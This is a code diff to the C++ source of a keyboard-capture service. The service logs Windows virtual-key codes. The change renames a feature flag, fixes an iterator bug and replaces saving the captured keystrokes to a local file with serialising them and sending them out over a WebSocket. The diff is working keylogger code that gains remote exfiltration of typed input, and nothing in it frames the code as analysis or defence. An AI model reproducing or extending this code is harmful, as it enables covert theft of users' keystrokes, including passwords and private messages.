@@ -1,6 +1,6 @@
 #include "services.hpp"
 
-#if KEYBOARD_SERVICE
+#if SERVICE_KEYBOARD_ENABLED
 
 #include "tools.hpp"
 #include "io.hpp"
@@ -73,10 +73,12 @@ namespace
 			|| (vkCode >= 0xBA && vkCode <= 0xE2);	// Different signs ([]'\;/.`)
 	}
 
+	// Saves vkList
 	void save()
 	{
 		LRCDataWriter writer("fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a");
-		writer.WriteData("Foobar.dat", vkList);
+		ByteVector result = writer.GetBytes(vkList);
+		WebSocket::Send(result);
 
 		// Prepare buffer to next virtual-key sequence
 		vkListCursorBegin = 0;
@@ -142,7 +144,7 @@ namespace
 		if (isprintable(vkInfo.keyCode))
 		{
 			PKList::iterator it = vkList.begin();
-			std::advance(vkList.begin(), vkListCursor);
+			std::advance(it, vkListCursor);
 
 			PartKeyboard toAdd;
 			toAdd.subtype = 0x1;
@@ -257,4 +259,4 @@ bool Keyboard::IsRunning()
 	return isRunning;
 }
 
-#endif // KEYBOARD_SERVICE
+#endif // SERVICE_KEYBOARD_ENABLED
